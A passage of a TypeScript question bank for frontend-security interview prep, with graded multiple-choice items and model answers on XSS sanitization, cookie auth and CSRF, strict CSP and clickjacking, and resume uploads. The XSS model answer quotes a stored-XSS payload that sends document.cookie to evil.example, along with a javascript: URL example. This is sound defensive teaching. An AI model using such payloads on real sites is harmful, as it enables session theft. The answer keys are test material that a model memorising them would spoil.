import type { DesignQuestion } from '../schema';

/**
 * Frontend security and browser-internals scenarios: XSS, auth/CSRF, CSP, file uploads,
 * memory leaks and Web Workers. Graded MCQs + a self-assessed answer.
 * Facts checked against OWASP Cheat Sheet Series, MDN, web.dev, Chrome DevTools docs and react.dev on 2026-11-26.
 */

const VERIFIED = '2026-11-26';

const NO_FREQUENCY_EVIDENCE =
  'No public interview-report evidence was collected for this exact question, so frequency is LOW_CONFIDENCE and no company is claimed to ask it. The scenario is an original exercise built on the documentation listed as evidence; every header, API and recommendation in the answer was checked against those pages on 2026-11-26.';

export const ARCH_QUESTIONS_SECURITY_BROWSER: DesignQuestion[] = [
  // ---------------------------------------------------------------------------------------------
  // 1. XSS in recruiter-authored job descriptions
  // ---------------------------------------------------------------------------------------------
  {
    schemaVersion: 1,
    kind: 'design',
    execution: 'quiz',
    track: 'architecture',
    id: 'arch-xss-job-description',
    slug: 'xss-job-description',
    title: 'Safely render recruiter-authored HTML job descriptions',
    difficulty: 'medium',
    priority: 'P0',
    seniority: ['Senior', 'SDE-2', 'SDE-3', 'MTS'],
    topics: ['XSS', 'dangerouslySetInnerHTML', 'DOMPurify', 'javascript: URLs', 'Trusted Types', 'stored XSS'],
    estimatedMinutes: 20,
    conceptIds: ['xss-prevention', 'content-security-policy'],
    research: {
      provenance: 'DOCUMENTED_TECHNICAL_EXERCISE',
      frequencyConfidence: 'LOW_CONFIDENCE',
      verificationStatus: 'SOURCES_VERIFIED',
      lastVerified: VERIFIED,
      evidence: [
        { sourceId: 'owasp-xss', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html', originalTitle: 'Cross Site Scripting Prevention Cheat Sheet', note: 'Framework escape hatches incl. dangerouslySetInnerHTML; React 19 javascript: URL blocking "does not replace application-specific URL validation"; DOMPurify recommended.' },
        { sourceId: 'react-dom-common', url: 'https://react.dev/reference/react-dom/components/common', originalTitle: 'Common components (e.g. <div>)', note: 'dangerouslySetInnerHTML takes { __html }, "extreme caution", XSS risk.' },
        { sourceId: 'mdn-trusted-types', url: 'https://developer.mozilla.org/docs/Web/API/Trusted_Types_API', originalTitle: 'Trusted Types API' },
      ],
      researchNotes: `${NO_FREQUENCY_EVIDENCE} "Safe rendering of job descriptions" appears in the learner's own prep plan for a job-listing design; it is the scenario, not evidence.`,
    },
    scenario: `Recruiters write job descriptions in a rich text editor. The HTML is stored as-is and rendered on the public job page (seen by thousands of candidates) and inside the recruiter dashboard (where recruiters are logged in with access to candidate data):

~~~tsx
<div className="job-body" dangerouslySetInnerHTML={{ __html: job.descriptionHtml }} />
<a href={job.applyUrl}>Apply on company site</a>
~~~

A security review flags both lines. Explain the attacks, fix the rendering path end to end, and tell me what defence-in-depth you would add. Does React not already protect us?`,
    constraints: [
      'Recruiters need headings, lists, bold/italic and links; nothing else.',
      'Existing stored HTML cannot be re-edited by hand.',
      'Pages are server-rendered for SEO and hydrated on the client.',
    ],
    answerOutline: [
      'React escapes text and attribute values in JSX by default; dangerouslySetInnerHTML and URL attributes are explicit escape hatches.',
      'Stored XSS: `<img src=x onerror=…>` or an SVG payload in descriptionHtml runs for every viewer; in the dashboard it runs with recruiter privileges.',
      '`href={job.applyUrl}` can carry a `javascript:` URL; React 19 blocks javascript: URLs but OWASP says this does not replace URL validation — allowlist https:/mailto: after parsing with new URL().',
      'Sanitize with an allowlist sanitizer (OWASP recommends DOMPurify) restricted to the tags/attributes product needs; sanitize at render time, on server and client, in one shared SafeHtml component.',
      'Also sanitize on save to keep stored data clean, but never rely on input sanitization alone.',
      'Links: add rel="noopener noreferrer" for target=_blank; consider rendering an allowlisted JSON document model instead of HTML.',
      'Defence in depth: strict nonce-based CSP, Trusted Types (require-trusted-types-for) so raw strings cannot reach innerHTML, lint rule banning raw dangerouslySetInnerHTML.',
      'Remediate existing data: run a backfill through the sanitizer and log what changed.',
    ],
    modelAnswer: `**Does React protect us?** Partly. JSX escapes text and attribute values, so \`<h1>{job.title}</h1>\` cannot inject markup. But React gives you explicit escape hatches, and this code uses two of them.

**Attack 1: stored XSS through \`dangerouslySetInnerHTML\`.** Any recruiter account, or an attacker who compromises one, can save \`<img src=x onerror="fetch('https://evil.example/?d='+document.cookie)">\`. The browser runs the handler for every candidate who views the job. In the dashboard it runs with a recruiter's session and can read or exfiltrate candidate data, or call APIs as that recruiter. OWASP lists \`dangerouslySetInnerHTML\` without sanitizing as exactly this kind of framework escape hatch, and the React docs warn that untrusted HTML here means "you risk introducing an XSS vulnerability".

**Attack 2: \`javascript:\` URLs.** If \`applyUrl\` is \`javascript:stealSession()\`, clicking it runs script. React 19 blocks \`javascript:\` URLs in \`href\` and \`src\`, but OWASP notes this "does not replace application-specific URL validation". You still want an allowlist so you never render \`data:\` URLs, unexpected hosts or malformed values.

**Fix: one rendering path.**

~~~tsx
import DOMPurify from 'isomorphic-dompurify';

const POLICY = { ALLOWED_TAGS: ['h2', 'h3', 'p', 'ul', 'ol', 'li', 'strong', 'em', 'a', 'br'], ALLOWED_ATTR: ['href'] };

export function SafeHtml({ html }: { html: string }) {
  const clean = useMemo(() => DOMPurify.sanitize(html, POLICY), [html]);
  return <div className="prose" dangerouslySetInnerHTML={{ __html: clean }} />;
}

export function safeUrl(raw: string): string | undefined {
  try {
    const u = new URL(raw);
    return u.protocol === 'https:' || u.protocol === 'mailto:' ? u.href : undefined;
  } catch { return undefined; }
}
~~~

- Sanitize **at render time**, on both server and client (an isomorphic build of DOMPurify, which OWASP recommends), so SSR output and hydration match and are both safe.
- Use a **tag and attribute allowlist** that matches what product needs, not a blocklist.
- Sanitize **on save** as well so stored data is clean, but treat that as hygiene. The render-time sanitizer is the control.
- Run a **backfill** of existing descriptions through the sanitizer, logging any changes for review.
- Better long term: store the editor's **JSON document model** and render it to React elements, so there is no HTML string to inject.

**Defence in depth.**
- A strict, nonce-based **CSP**, so an injected script without the nonce does not run even if sanitization has a bug.
- **Trusted Types** (\`require-trusted-types-for 'script'\`), so assigning a raw string to \`innerHTML\` throws unless it went through a registered policy. Make \`SafeHtml\` that policy.
- A **lint rule** banning \`dangerouslySetInnerHTML\` outside \`SafeHtml\`, plus a test suite of known XSS payloads.
- Keep session cookies **HttpOnly** to limit what a successful XSS can read. Note that it can still make requests as the user.`,
    pitfalls: [
      'Writing a regex to strip <script> tags — event handlers, SVG and malformed markup bypass it.',
      'Sanitizing only on input, then rendering the same data through a new sink later.',
      'Assuming React\'s javascript: URL blocking is a complete URL policy.',
      'Sanitizing only on the client in an SSR app, so the server HTML contains the payload.',
      'Allowing `style` or `class` attributes without considering CSS-based UI redress.',
    ],
    versionNotes:
      'Checked against OWASP XSS Prevention Cheat Sheet, react.dev Common components (dangerouslySetInnerHTML, accepts TrustedHTML) and MDN Trusted Types API (Baseline 2026) on 2026-11-26. React 19 javascript: URL blocking as described by OWASP.',
    docSourceIds: ['owasp-xss', 'react-dom-common', 'mdn-trusted-types', 'webdev-strict-csp'],
    mcqs: [
      {
        id: 'm1',
        question: 'Which of these is safe from XSS in React without extra work, assuming `name` is attacker-controlled?',
        options: [
          { id: 'a', text: '<p>{name}</p>', explanation: 'Correct — JSX text is escaped.' },
          { id: 'b', text: '<p dangerouslySetInnerHTML={{ __html: name }} />', explanation: 'Raw HTML sink — needs sanitization.' },
          { id: 'c', text: 'ref.current.innerHTML = name', explanation: 'Direct DOM sink — React is bypassed entirely.' },
          { id: 'd', text: '<iframe srcDoc={name} />', explanation: 'srcDoc renders a full HTML document from the string.' },
        ],
        correctOptionId: 'a',
        explanation: 'React escapes text content and attribute values; HTML sinks and direct DOM access are escape hatches you must protect.',
        sourceIds: ['owasp-xss', 'react-dom-common'],
      },
      {
        id: 'm2',
        question: 'What does OWASP recommend for sanitizing user-supplied HTML?',
        options: [
          { id: 'a', text: 'A regex that removes <script> tags', explanation: 'Trivially bypassed by event handler attributes and other vectors.' },
          { id: 'b', text: 'DOMPurify', explanation: 'Correct — OWASP recommends DOMPurify for HTML sanitization.' },
          { id: 'c', text: 'encodeURIComponent', explanation: 'That encodes URL components, not HTML.' },
          { id: 'd', text: 'JSON.stringify', explanation: 'That serialises data; it does not sanitize HTML.' },
        ],
        correctOptionId: 'b',
        explanation: 'Use a maintained allowlist sanitizer configured for the tags and attributes you need.',
        sourceIds: ['owasp-xss'],
      },
      {
        id: 'm3',
        question: 'With `require-trusted-types-for \'script\'` enforced, what happens when code runs `el.innerHTML = userString`?',
        options: [
          { id: 'a', text: 'The string is sanitized automatically', explanation: 'Trusted Types does not sanitize by itself; it requires a policy-created value.' },
          { id: 'b', text: 'It throws a TypeError because a plain string reached an injection sink', explanation: 'Correct.' },
          { id: 'c', text: 'It works, but logs a warning', explanation: 'Enforced mode blocks the assignment.' },
          { id: 'd', text: 'Only <script> tags are removed', explanation: 'The whole assignment is rejected.' },
        ],
        correctOptionId: 'b',
        explanation: 'Trusted Types forces every value reaching an HTML/script sink through a reviewed policy function, turning DOM XSS bugs into visible errors.',
        sourceIds: ['mdn-trusted-types'],
      },
    ],
    followUps: [
      { id: 'f1', level: 'definition', question: 'Explain stored, reflected and DOM-based XSS with one example each.', expectedConcepts: ['stored in database', 'reflected from request', 'client-side source to sink'], sourceIds: ['owasp-xss'] },
      { id: 'f2', level: 'mechanism', question: 'Why must sanitization be context-specific?', expectedConcepts: ['HTML body vs attribute vs URL vs JS contexts', 'different encoding rules', 'sanitize for the sink'], sourceIds: ['owasp-xss'] },
      { id: 'f3', level: 'edge-cases', question: 'A pasted Word document contains <style> and inline styles. What do you allow?', expectedConcepts: ['strip style tags', 'allowlist only', 'CSS can redress UI or exfiltrate', 'map to editor marks'], sourceIds: ['owasp-xss'] },
      { id: 'f4', level: 'production', question: 'How would you roll out Trusted Types in an existing React app?', expectedConcepts: ['report-only first', 'default policy', 'fix third-party sinks', 'SafeHtml as the only policy'], sourceIds: ['mdn-trusted-types'] },
    ],
  },

  // ---------------------------------------------------------------------------------------------
  // 2. Auth tokens and CSRF
  // ---------------------------------------------------------------------------------------------
  {
    schemaVersion: 1,
    kind: 'design',
    execution: 'quiz',
    track: 'architecture',
    id: 'arch-auth-tokens-csrf',
    slug: 'auth-tokens-csrf',
    title: 'Store auth tokens and stop CSRF in a recruiter SPA',
    difficulty: 'hard',
    priority: 'P0',
    seniority: ['Senior', 'SDE-3', 'MTS'],
    topics: ['CSRF', 'cookies', 'HttpOnly', 'SameSite', 'Fetch Metadata', 'token storage', 'localStorage'],
    estimatedMinutes: 25,
    conceptIds: ['csrf-cookies', 'xss-prevention'],
    research: {
      provenance: 'DOCUMENTED_TECHNICAL_EXERCISE',
      frequencyConfidence: 'LOW_CONFIDENCE',
      verificationStatus: 'SOURCES_VERIFIED',
      lastVerified: VERIFIED,
      evidence: [
        { sourceId: 'owasp-csrf', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html', originalTitle: 'Cross-Site Request Forgery Prevention Cheat Sheet', note: 'Synchronizer token, signed double-submit cookie, custom headers, Sec-Fetch-Site; "XSS can defeat all CSRF mitigation techniques".' },
        { sourceId: 'mdn-set-cookie', url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie', originalTitle: 'Set-Cookie header', note: 'HttpOnly, Secure, SameSite, __Host- prefix.' },
      ],
      researchNotes: `${NO_FREQUENCY_EVIDENCE} The OWASP SameSite section was only partly read, so the answer treats SameSite as defence in depth rather than quoting OWASP on it.`,
    },
    scenario: `The recruiter SPA currently logs in by calling \`POST /api/login\`, receiving a JWT, and saving it to \`localStorage\`. Every request adds \`Authorization: Bearer <token>\`. The token lives for 30 days.

The security team wants to move to cookies "to fix XSS". A colleague replies that cookies "bring CSRF back". Settle the debate: compare the options, design the final auth storage and CSRF protection, and explain what neither option protects against.`,
    constraints: [
      'SPA at app.ats.example, API at api.ats.example (same site, different origin).',
      'Public job pages live at jobs.ats.example and embed no authenticated UI.',
      'The product handles candidate PII; assume SOC 2 audits.',
    ],
    answerOutline: [
      'localStorage tokens: immune to CSRF (not sent automatically) but readable by any XSS and exfiltrated for 30 days.',
      'HttpOnly cookies: not readable by JS, but sent automatically, so state-changing endpoints need CSRF defences.',
      'Neither protects against XSS making authenticated requests while the user is on the page; OWASP: XSS defeats all CSRF mitigations.',
      'Design: session cookie with HttpOnly, Secure, SameSite=Lax or Strict, __Host- prefix (no Domain, Path=/), short idle timeout and server-side revocation.',
      'CSRF: Fetch Metadata check (reject cross-site Sec-Fetch-Site for mutations) plus a synchronizer or signed double-submit token in a custom header; never mutate on GET.',
      'CORS: allow only the app origin with credentials; CORS is about reading responses, not CSRF.',
      'Same-site subdomains (jobs.ats.example) count as same-site for SameSite — another reason not to rely on SameSite alone.',
      'Shorten lifetimes: short access, rotating refresh, logout invalidates server session.',
    ],
    modelAnswer: `**The trade-off.**

| | Token in \`localStorage\` | HttpOnly session cookie |
|---|---|---|
| Readable by injected script | Yes, and can be exfiltrated and reused elsewhere for 30 days | No |
| Sent automatically cross-site | No, so no CSRF | Yes, so CSRF defences are needed |
| Survives XSS | Attacker keeps the token | Attacker can act only while the page is open |

So both sides are right. Cookies do not "fix XSS". They stop the token being *stolen*, but injected script can still call the API as the user while the tab is open. OWASP is blunt that XSS can defeat **all** CSRF mitigations. XSS prevention (sanitization, CSP) remains the primary control either way.

**Design I would ship.**

1. **Session cookie**: \`Set-Cookie: __Host-session=…; HttpOnly; Secure; SameSite=Lax; Path=/\`. Per MDN, \`HttpOnly\` hides it from \`document.cookie\`, \`Secure\` restricts it to HTTPS, and the \`__Host-\` prefix forces Secure, no \`Domain\` and \`Path=/\`, so a sibling subdomain cannot set or overwrite it. Set \`SameSite\` explicitly. MDN only says *some* browsers default to \`Lax\`.
2. **Server-side session** with an idle timeout (for example 30 minutes for PII screens), absolute lifetime, rotation on login and privilege change, and revocation on logout.
3. **CSRF defences** on every state-changing request:
   - **Fetch Metadata**: reject when \`Sec-Fetch-Site\` is \`cross-site\` (OWASP calls it the primary signal), and fall back to verifying \`Origin\` when the header is missing.
   - A **synchronizer token**, or a **signed** double-submit cookie (OWASP discourages the naive unsigned version), sent in a custom header like \`X-CSRF-Token\`. Cross-site forms cannot set custom headers, and cross-origin \`fetch\` with one triggers a CORS preflight that the API refuses.
   - **No state change on GET.**
4. **CORS**: allow exactly \`https://app.ats.example\` with credentials. CORS controls who can *read* responses. It does not stop a form POST from being sent.
5. **SameSite is defence in depth, not the defence.** \`jobs.ats.example\` is same-site with the app, so an XSS on the public job pages could send same-site requests that carry the cookie. The token and Fetch Metadata checks still apply there.

**If the API must stay token-based** (mobile clients, third-party integrations), keep a short-lived access token **in memory only**, and obtain it from a refresh endpoint protected by the HttpOnly cookie plus CSRF checks. Then an XSS can read at most a token that expires in minutes.

**What none of this covers.** It does not stop XSS acting as the user, malicious browser extensions, a compromised third-party script, or session theft from an unlocked machine. For those you need CSP, Trusted Types, a third-party script inventory, step-up re-authentication for sensitive actions (exporting candidate data), and audit logging.`,
    pitfalls: [
      'Claiming HttpOnly cookies prevent XSS — they only prevent reading the cookie.',
      'Relying on SameSite alone, forgetting same-site subdomains and explicit-attribute differences between browsers.',
      'Thinking CORS blocks CSRF.',
      'Using the naive (unsigned) double-submit cookie pattern.',
      'Long-lived tokens in localStorage with no revocation.',
    ],
    versionNotes:
      'Checked against the OWASP CSRF Prevention Cheat Sheet and MDN Set-Cookie on 2026-11-26. MDN: "Some browsers use Lax as the default value if SameSite is not specified"; __Host- requires Secure, no Domain and Path=/.',
    docSourceIds: ['owasp-csrf', 'mdn-set-cookie', 'owasp-xss'],
    mcqs: [
      {
        id: 'm1',
        question: 'Which statement about HttpOnly cookies is correct?',
        options: [
          { id: 'a', text: 'They prevent XSS', explanation: 'Injected script still runs and can make authenticated requests.' },
          { id: 'b', text: 'JavaScript cannot read them via document.cookie, but they are still sent with fetch/XHR requests', explanation: 'Correct.' },
          { id: 'c', text: 'They are never sent cross-site', explanation: 'That is SameSite, not HttpOnly.' },
          { id: 'd', text: 'They are only sent over HTTPS', explanation: 'That is the Secure attribute.' },
        ],
        correctOptionId: 'b',
        explanation: 'HttpOnly forbids JavaScript access to the cookie value; the browser still attaches it to matching requests.',
        sourceIds: ['mdn-set-cookie'],
      },
      {
        id: 'm2',
        question: 'Why does a custom request header (e.g. X-CSRF-Token) help against CSRF?',
        options: [
          { id: 'a', text: 'Headers are encrypted', explanation: 'HTTPS encrypts everything equally; that is not the reason.' },
          { id: 'b', text: 'A cross-site HTML form cannot set custom headers, and a cross-origin fetch with one needs a CORS preflight the API can refuse', explanation: 'Correct.' },
          { id: 'c', text: 'Browsers strip cookies when custom headers are present', explanation: 'They do not.' },
          { id: 'd', text: 'It replaces the need for authentication', explanation: 'It complements authentication.' },
        ],
        correctOptionId: 'b',
        explanation: 'OWASP lists custom request headers for AJAX/API calls as a CSRF defence because attackers cannot add them cross-site without passing CORS.',
        sourceIds: ['owasp-csrf'],
      },
      {
        id: 'm3',
        question: 'Which defence does OWASP say XSS can defeat?',
        options: [
          { id: 'a', text: 'Only the double-submit cookie', explanation: 'OWASP says XSS can defeat all CSRF mitigation techniques.' },
          { id: 'b', text: 'All CSRF mitigation techniques', explanation: 'Correct — script in your origin can read tokens and send same-origin requests.' },
          { id: 'c', text: 'None, if SameSite=Strict is used', explanation: 'Requests made by injected script are same-site.' },
          { id: 'd', text: 'Only Fetch Metadata checks', explanation: 'Injected script produces same-origin Fetch Metadata.' },
        ],
        correctOptionId: 'b',
        explanation: 'CSRF defences assume the attacker is on another site. Injected script is on your site, so preventing XSS comes first.',
        sourceIds: ['owasp-csrf'],
      },
    ],
    followUps: [
      { id: 'f1', level: 'definition', question: 'Explain CSRF in two sentences. What does an attacker need?', expectedConcepts: ['ambient credentials sent automatically', 'state-changing request from another site', 'victim logged in'], sourceIds: ['owasp-csrf'] },
      { id: 'f2', level: 'mechanism', question: 'What does Sec-Fetch-Site tell the server, and what is the fallback?', expectedConcepts: ['same-origin / same-site / cross-site / none', 'browser-set, cannot be forged by page script', 'Origin/Referer fallback'], sourceIds: ['owasp-csrf'] },
      { id: 'f3', level: 'application', question: 'How do you manage permissions for candidate, recruiter and admin roles on the frontend?', expectedConcepts: ['server is the authority', 'frontend hides UI only', 'permission claims from session endpoint', 'route guards plus API checks'], sourceIds: ['next-data-security'] },
      { id: 'f4', level: 'production', question: 'Multiple organisations use the same ATS. How do you prevent data leaking between tenants on the frontend?', expectedConcepts: ['tenant scoped on server from session, not from URL alone', 'cache keys include tenant', 'clear caches on tenant switch/logout', 'no shared parent-domain cookies'], sourceIds: ['mdn-set-cookie'] },
    ],
  },

  // ---------------------------------------------------------------------------------------------
  // 3. CSP rollout + clickjacking
  // ---------------------------------------------------------------------------------------------
  {
    schemaVersion: 1,
    kind: 'design',
    execution: 'quiz',
    track: 'architecture',
    id: 'arch-csp-rollout',
    slug: 'csp-rollout',
    title: 'Roll out a strict CSP without breaking production',
    difficulty: 'hard',
    priority: 'P1',
    seniority: ['Senior', 'SDE-3', 'MTS'],
    topics: ['Content Security Policy', 'nonces', "'strict-dynamic'", 'Report-Only', 'frame-ancestors', 'clickjacking'],
    estimatedMinutes: 20,
    conceptIds: ['content-security-policy', 'xss-prevention'],
    research: {
      provenance: 'DOCUMENTED_TECHNICAL_EXERCISE',
      frequencyConfidence: 'LOW_CONFIDENCE',
      verificationStatus: 'SOURCES_VERIFIED',
      lastVerified: VERIFIED,
      evidence: [
        { sourceId: 'webdev-strict-csp', url: 'https://web.dev/articles/strict-csp', originalTitle: 'Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)', note: 'Nonce-based policy, 128+ bit nonce per response, Report-Only rollout, old-browser fallback.' },
        { sourceId: 'mdn-csp', url: 'https://developer.mozilla.org/docs/Web/Security/CSP', originalTitle: 'Content Security Policy (CSP)', note: "frame-ancestors 'none' against clickjacking; replaces X-Frame-Options." },
        { sourceId: 'mdn-trusted-types', url: 'https://developer.mozilla.org/docs/Web/API/Trusted_Types_API', originalTitle: 'Trusted Types API' },
      ],
      researchNotes: NO_FREQUENCY_EVIDENCE,
    },
    scenario: `Your healthcare SaaS app is server-rendered React. It loads an analytics tag, a support chat widget, and Stripe for billing. It has no CSP. After a pen test you are asked to "add CSP" this sprint.

The first attempt was:

~~~
Content-Security-Policy: default-src 'self'; script-src 'self' https://*.googleapis.com https://cdn.jsdelivr.net 'unsafe-inline'
~~~

Critique it, design the policy you would ship, and describe the rollout. Also explain how you would stop another site from framing the app (clickjacking).`,
    constraints: [
      'Server-rendered HTML; some pages are cached at a CDN.',
      'Third-party scripts cannot be removed this quarter.',
      'Zero tolerance for breaking checkout.',
    ],
    answerOutline: [
      "'unsafe-inline' allows any inline script, so injected <script> runs — the policy gives almost no XSS protection.",
      'Broad host allowlists (wildcards, public CDNs) can be bypassed via hosted libraries or JSONP endpoints.',
      "Strict policy: script-src 'nonce-{RANDOM}' 'strict-dynamic'; object-src 'none'; base-uri 'none' — nonce fresh per response, 128+ bits.",
      "'strict-dynamic' lets nonced loaders (analytics, chat) load their dependencies without listing hosts.",
      'Inline event handlers (onclick="…") must be refactored; the SSR framework must stamp the nonce on its own scripts.',
      'CDN caching: a cached HTML page reuses its nonce — vary by request, cache only the data, or use hashes for static pages.',
      'Rollout: Content-Security-Policy-Report-Only, collect reports, fix, then enforce; keep reporting on.',
      "Clickjacking: frame-ancestors 'none' (or a specific allowlist) — it replaces X-Frame-Options.",
    ],
    modelAnswer: `**What is wrong with the first attempt.**
- \`'unsafe-inline'\` lets **any** inline script run, including one injected through an XSS bug. That is the exact case CSP is supposed to stop, so the policy offers almost no XSS protection.
- \`https://cdn.jsdelivr.net\` and \`*.googleapis.com\` allow scripts from huge public hosts. An attacker can load an old library with a known gadget, or a JSONP endpoint, from those hosts and run code. This is why web.dev recommends **nonces** over host allowlists.
- There is no \`object-src\` or \`base-uri\`, and nothing against framing.

**The policy I would ship** (the web.dev strict CSP, plus framing):

~~~
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  report-to csp-endpoint
~~~

- **\`'nonce-{RANDOM}'\`**: only \`<script nonce="…">\` tags with this response's nonce run. The nonce must be fresh for every response (web.dev: ideally 128+ bits).
- **\`'strict-dynamic'\`**: scripts you trusted with the nonce may load further scripts. The analytics loader and chat widget can then fetch their own dependencies without listing every host.
- **\`https: 'unsafe-inline'\`** is only a fallback for very old browsers. Browsers that support nonces and \`'strict-dynamic'\` ignore it.
- **\`object-src 'none'\`** blocks plugins. **\`base-uri 'none'\`** stops an injected \`<base>\` from redirecting relative script URLs.
- **\`frame-ancestors 'none'\`** stops other sites embedding the app in an iframe. That blocks **clickjacking**, where a transparent frame tricks a logged-in user into clicking "Export candidates". MDN describes it as the more flexible replacement for \`X-Frame-Options\`. If a partner must embed a page, list that origin on that route only.

**Engineering work.**
1. Generate the nonce in middleware per request and pass it to the renderer, so the framework stamps it on its own hydration scripts and on the third-party loader tags.
2. Remove inline event handlers (\`onclick="…"\`) and \`javascript:\` links. They are blocked under a nonce policy.
3. **CDN caching**: a cached HTML page would serve one nonce to everyone. Either do not cache the HTML document at the edge, or vary it per request. For truly static pages, use hash-based CSP instead.

**Rollout.**
1. Ship the policy as **\`Content-Security-Policy-Report-Only\`** to all traffic. Nothing breaks, and violations are reported.
2. Triage the reports: missing nonces, inline handlers, browser-extension noise (filter it out), and third parties needing exceptions. Run checkout end-to-end tests with the policy enforced in staging.
3. **Enforce** gradually (internal users, then a percentage), keeping \`report-to\` on and alerting on spikes.
4. Next step: add \`require-trusted-types-for 'script'\` in Report-Only to find DOM XSS sinks, then enforce.

**Remember** that CSP is defence in depth. Escaping and sanitization still come first, and CSP does not stop an injected HTML form or link that fools the user.`,
    pitfalls: [
      "Shipping 'unsafe-inline' without a nonce, which disables most XSS protection.",
      'Reusing one nonce across responses (static value or CDN-cached HTML).',
      'Enforcing on day one without a Report-Only phase.',
      'Allowlisting whole public CDNs.',
      'Forgetting frame-ancestors, leaving clickjacking open.',
    ],
    versionNotes:
      "Checked against web.dev Strict CSP (nonce-based policy, 'strict-dynamic', object-src/base-uri 'none', Report-Only; support Chrome 52, Firefox 52, Safari 15.4) and MDN CSP (frame-ancestors) on 2026-11-26.",
    docSourceIds: ['webdev-strict-csp', 'mdn-csp', 'mdn-trusted-types'],
    mcqs: [
      {
        id: 'm1',
        question: "What does 'strict-dynamic' do in `script-src 'nonce-abc' 'strict-dynamic'`?",
        options: [
          { id: 'a', text: 'Allows any script from any host', explanation: 'Only scripts loaded by already-trusted scripts are allowed.' },
          { id: 'b', text: 'Lets scripts trusted via the nonce load additional scripts, while host allowlists are ignored', explanation: 'Correct.' },
          { id: 'c', text: 'Rotates the nonce automatically', explanation: 'The server must generate a new nonce per response.' },
          { id: 'd', text: 'Enables inline event handlers', explanation: 'Inline handlers remain blocked.' },
        ],
        correctOptionId: 'b',
        explanation: "'strict-dynamic' propagates trust from nonced scripts to the scripts they load, which makes strict CSP workable with loaders and tag managers.",
        sourceIds: ['webdev-strict-csp'],
      },
      {
        id: 'm2',
        question: 'Which header directive prevents clickjacking?',
        options: [
          { id: 'a', text: "script-src 'self'", explanation: 'Controls scripts, not framing.' },
          { id: 'b', text: "frame-ancestors 'none'", explanation: 'Correct — it controls which documents may embed this page.' },
          { id: 'c', text: "frame-src 'none'", explanation: 'frame-src controls what your page may embed, not who may embed you.' },
          { id: 'd', text: 'SameSite=Strict', explanation: 'A cookie attribute, not a framing control.' },
        ],
        correctOptionId: 'b',
        explanation: "MDN calls frame-ancestors an effective protection against clickjacking and recommends 'none' unless the site must be embeddable.",
        sourceIds: ['mdn-csp'],
      },
      {
        id: 'm3',
        question: 'Why is a nonce-based CSP risky for HTML cached at a CDN?',
        options: [
          { id: 'a', text: 'CDNs strip CSP headers', explanation: 'They forward headers normally.' },
          { id: 'b', text: 'Every user receives the same nonce, so an attacker can learn it and reuse it in injected markup', explanation: 'Correct.' },
          { id: 'c', text: 'Nonces only work over HTTP/1.1', explanation: 'Protocol version is irrelevant.' },
          { id: 'd', text: 'Cached pages cannot run scripts', explanation: 'They run normally.' },
        ],
        correctOptionId: 'b',
        explanation: 'A nonce must be unpredictable and unique per response. Use hashes for static pages or avoid caching the HTML document.',
        sourceIds: ['webdev-strict-csp'],
      },
    ],
    followUps: [
      { id: 'f1', level: 'mechanism', question: 'Nonce vs hash-based CSP: when would you use each?', expectedConcepts: ['nonce for server-rendered dynamic pages', 'hash for static pages / SPAs served from CDN', 'hash must match exact script content'], sourceIds: ['webdev-strict-csp'] },
      { id: 'f2', level: 'application', question: 'How do you pass a nonce to React SSR and third-party script tags?', expectedConcepts: ['generate in middleware', 'pass through request context/header', 'nonce prop on script tags', 'framework support for nonce'], sourceIds: ['webdev-strict-csp'] },
      { id: 'f3', level: 'edge-cases', question: 'CSP reports are flooded with violations from chrome-extension:// URLs. What do you do?', expectedConcepts: ['filter extension sources', 'sample reports', 'focus on first-party violations'], sourceIds: ['mdn-csp'] },
      { id: 'f4', level: 'production', question: 'Which other security headers would you add for a SOC 2 audit?', expectedConcepts: ['Strict-Transport-Security', 'X-Content-Type-Options: nosniff', 'Referrer-Policy', 'Permissions-Policy'], sourceIds: ['mdn-csp'] },
    ],
  },

  // ---------------------------------------------------------------------------------------------
  // 4. Secure resume upload + preview
  // ---------------------------------------------------------------------------------------------
  {
    schemaVersion: 1,
    kind: 'design',
    execution: 'quiz',
    track: 'architecture',
    id: 'arch-secure-resume-upload',
    slug: 'secure-resume-upload',
    title: 'Upload and preview resumes securely',
    difficulty: 'medium',
    priority: 'P1',
    seniority: ['Senior', 'SDE-2', 'SDE-3'],
    topics: ['file upload', 'presigned URLs', 'content sniffing', 'iframe sandbox', 'resume preview', 'progress and retries'],
    estimatedMinutes: 25,
    conceptIds: ['xss-prevention', 'web-workers', 'abort-controller'],
    research: {
      provenance: 'DOCUMENTED_TECHNICAL_EXERCISE',
      frequencyConfidence: 'LOW_CONFIDENCE',
      verificationStatus: 'SOURCES_VERIFIED',
      lastVerified: VERIFIED,
      evidence: [
        { sourceId: 'owasp-file-upload', url: 'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html', originalTitle: 'File Upload Cheat Sheet', note: 'Allowlist extensions, do not trust Content-Type, rename files, separate server / outside webroot, size limits.' },
        { sourceId: 'mdn-iframe', url: 'https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe', originalTitle: '<iframe>', note: 'sandbox attribute.' },
        { sourceId: 'mdn-abortcontroller', url: 'https://developer.mozilla.org/en-US/docs/Web/API/AbortController', originalTitle: 'AbortController' },
      ],
      researchNotes: `${NO_FREQUENCY_EVIDENCE} The OWASP page does not mention Content-Disposition; the answer's use of it comes from general HTTP practice and is labelled as such.`,
    },
    scenario: `Candidates upload resumes (PDF or DOCX, up to 10 MB) when applying. Recruiters preview them inside the ATS next to the candidate's profile. Today the frontend posts the file to \`/api/upload\`, the server saves it under \`/public/uploads/<original-filename>\`, and the dashboard previews it with \`<iframe src="/public/uploads/jane_cv.pdf">\`.

Design the upload and preview flow, frontend and backend touchpoints, with security, UX and failure handling.`,
    constraints: [
      'Files contain PII; access must be limited to recruiters of the hiring organisation.',
      'Candidates are often on slow mobile networks.',
      'Recruiters need an inline preview without downloading.',
    ],
    answerOutline: [
      'Client validation (extension allowlist, size, MIME hint) is UX only; the server re-validates — OWASP: do not trust Content-Type, allowlist extensions, set a size limit.',
      'Never keep user filenames: generate an id, store original name as metadata.',
